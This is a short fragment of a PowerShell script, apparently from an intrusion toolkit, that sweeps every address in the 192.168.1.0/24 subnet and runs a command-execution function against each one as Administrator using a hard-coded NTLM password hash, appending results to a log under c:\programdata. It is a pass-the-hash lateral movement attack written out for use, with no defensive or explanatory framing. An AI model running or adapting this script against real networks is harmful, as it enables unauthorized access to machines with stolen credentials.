...
$i=1..255;
foreach($item in $i){
"192.168.1.$item" | Out-File -Append c:\programdata\log.txt;
sleep 1;
Invoke-MYExec -Target "192.168.1.$item" -Username Administrator -Hash D8ACDCAF3510FD80D42A247432E72E2F | Out-File -Append c:\programdata\log.txt;
}
